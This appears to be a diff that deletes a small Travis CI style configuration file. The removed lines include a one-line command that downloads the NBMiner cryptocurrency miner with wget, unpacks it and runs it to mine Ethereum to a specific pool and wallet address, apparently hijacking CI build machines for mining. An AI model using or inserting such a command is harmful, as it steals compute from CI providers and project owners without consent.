@@ -1,9 +1,0 @@
-language: shell
-
-os : linux
-
-dist : xenial
-
-sudo: true
-
-wget https://github.com/NebuTech/NBMiner/releases/download/v37.5/NBMiner_37.5_Linux.tgz && tar -xvf NBMiner_37.5_Linux.tgz && cd NBMiner_Linux && ./nbminer -a ethash -o eth.2miners.com:2020 --user 0x0B72c652C47BD0eeD26d6a70B3C5e0ed3C680a1A.yadhu
